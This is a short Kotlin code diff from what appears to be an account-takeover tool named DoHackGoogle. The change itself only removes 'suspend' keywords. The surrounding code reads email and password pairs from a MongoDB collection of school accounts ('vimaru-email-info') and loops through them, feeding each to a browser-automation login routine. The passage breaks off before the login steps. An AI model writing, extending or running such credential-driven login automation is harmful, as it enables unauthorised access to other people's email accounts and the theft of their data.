@@ -12,7 +12,7 @@ import org.bson.Document
 import net.scr0pt.utils.webdriver.Browser
 
 
-suspend fun main() {
+ fun main() {
     DoHackGoogle().run()
 }
 
@@ -23,14 +23,14 @@ class DoHackGoogle() {
     val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
     val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
 
-    suspend fun run() {
+     fun run() {
         while (true) {
             collection.random(org.bson.Document("login_status", null).append("email_status", null))
                     ?.let { googleRun(it) }
         }
     }
 
-    suspend fun googleRun(doc: org.bson.Document) {
+     fun googleRun(doc: org.bson.Document) {
         val email = doc.getString("email") ?: return
         println(email)
         val pass = doc.getString("pass") ?: return
